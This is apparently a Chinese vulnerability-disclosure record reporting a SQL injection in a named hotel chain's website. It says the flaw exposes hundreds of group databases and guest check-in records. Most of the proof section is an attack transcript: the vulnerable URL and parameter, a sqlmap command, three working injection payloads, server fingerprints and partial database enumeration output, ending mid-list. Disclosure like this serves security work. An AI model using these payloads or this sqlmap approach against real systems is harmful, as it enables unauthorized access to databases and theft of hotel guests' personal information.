wybug_title: 广州岭南佳园连锁酒店有限公司官网注入漏洞导致该集团下大量网站数据库和个人信息泄露
wybug_corp: 广州岭南佳园连锁酒店有限公司
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-05-13：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-06-27：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 广州岭南佳园连锁酒店有限公司主站是基于php+MySQL搭建，该网站存在一个sql注入漏洞，可导致该集团下面数百个网站数据库和大量个人酒店入住信息被泄露。 详细说明：  该注入点的类型是属于布尔型盲注，该数据库下存在900个数据库，主要是该集团下面的各个网站的数据库还有大量的酒店入住人员信息。   漏洞证明：  注入点：http://www.gardeninns.com.cn/hotel/QuickReservationAjax.php?checkInDate=2015-05-13&checkOutDate=2015-05-14&hotelId=1&roomQuantity=1基于的是hotelId参数sqlmap注入如下：sqlmap -u "http://www.gardeninns.com.cn//hotel/QuickReservationAjax.php?checkInDate=2015-05-13&checkOutDate=2015-05-14&hotelId=1&roomQuantity=1" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150403}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:02:49[13:02:49] [INFO] resuming back-end DBMS 'mysql' [13:02:49] [INFO] testing connection to the target URL[13:02:55] [INFO] heuristics detected web page charset 'ascii'[13:03:25] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDSsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: hotelId (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: checkInDate=2015-05-13&checkOutDate=2015-05-14&hotelId=1' RLIKE (SELECT (CASE WHEN (6017=6017) THEN 1 ELSE 0x28 END)) AND 'qokC'='qokC&roomQuantity=1    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: checkInDate=2015-05-13&checkOutDate=2015-05-14&hotelId=1' AND (SELECT 5184 FROM(SELECT COUNT(*),CONCAT(0x71787a7871,(SELECT (CASE WHEN (5184=5184) THEN 1 ELSE 0 END)),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Aviu'='Aviu&roomQuantity=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: checkInDate=2015-05-13&checkOutDate=2015-05-14&hotelId=-4916' OR 3595=SLEEP(5) AND 'TJkI'='TJkI&roomQuantity=1---[13:03:30] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0[13:03:30] [INFO] fetching database names[13:03:30] [INFO] the SQL query used returns 974 entries[13:03:32] [INFO] heuristics detected web page charset 'utf-8'[13:03:32] [INFO] retrieved: www_tjgjhotel_com^C[13:03:42] [WARNING] user aborted during enumeration. sqlmap will display partial outputavailable databases [784]:[*] ashar_asharhotels_com[*] austraders_harathotels_com[*]
